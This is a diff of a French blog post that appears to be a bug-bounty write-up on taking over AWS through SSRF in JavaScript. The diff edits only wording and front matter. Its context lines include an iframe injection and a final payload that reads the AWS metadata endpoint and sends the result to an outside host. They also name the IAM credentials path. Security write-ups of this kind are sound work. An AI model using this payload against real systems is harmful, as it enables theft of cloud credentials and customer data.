@@ -1,6 +1,7 @@
 ---
 date: 2018-10-02
-title: AWS takeover through SSRF in JavaScript
+slug: "prise-de-controle-aws-via-ssrf-en-javascript"
+title: "Prise de contrôle AWS via SSRF en JavaScript"
 images: [/images/aws-webservices.png]
 related:
   - /posts/ctf-h1-212
@@ -231,7 +232,7 @@ document.body.innerHTML += '<iframe src="https://poc.myserver.com">';
 Mais je n'ai toujours rien reçu !!!
 
 Parfois, il faut tester des trucs stupides soi-même pour se rendre compte à quel point c'était stupide...
-Évidemment, essayer de générer du code HTML était une erreur, mais bon ! Je ne suis qu'un hacker...
+Évidemment, essayer de générer du code HTML était une erreur, mais bon ! Je ne suis qu'un bug hunter...
 Pour en revenir à la requête AJAX, je suis resté bloqué dessus un bon moment.
 Il m'a fallu un temps fou pour comprendre comment la faire fonctionner.
 
@@ -304,7 +305,7 @@ Payload final:
 {...REDACTED...,"operation":"Union('1';'2;fetch(\"http://169.254.169.254/latest/meta-data/\").then(res=>res.text()).then((r)=>fetch(\"https://poc.myserver.com/?r=\"+r));';'3')"}
 ```
 
-N'ayant aucune connaissance des métadonnées AWS, puisque c'était ma première visite,
+N'ayant aucune connaissance des métadonnées AWS, puisque c'était ma première fois,
 j'ai pris le temps d'explorer les répertoires et tous les fichiers à ma disposition. Comme vous le lirez partout, le plus intéressant étant `http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>`.
 
 Ce qui a renvoyé :
@@ -353,7 +354,7 @@ Et soudain...
 À droite : l’entreprise possède 20 buckets contenant des données hautement sensibles de clients, des fichiers statiques pour l’application web et, 
 d’après leur nom, probablement des journaux/sauvegardes de ses serveurs.
 
-Impact : fatal.
+Impact : létal.
 
 
 ## Conclusion
